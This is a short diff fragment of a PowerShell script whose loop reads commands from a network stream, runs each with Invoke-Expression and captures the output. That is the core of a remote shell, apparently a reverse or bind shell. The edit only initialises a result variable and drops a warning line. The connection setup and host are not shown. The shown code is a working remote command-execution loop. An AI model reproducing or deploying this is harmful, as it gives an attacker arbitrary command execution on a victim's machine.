@@ -19,13 +19,14 @@ $stream.Flush()
 while (($i = $stream.Read($in_bytes, 0, $in_bytes.Length)) -ne 0)
 {
 	$cmd = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($in_bytes, 0, $i);
+	$result = ""
+	
 	try
 	{
 		$result = (iex $cmd 2>&1 | Out-String)
 	}
 	catch
 	{
-		Write-Warning "COMMAND ERROR" 
 		Write-Error $_
 	}
 
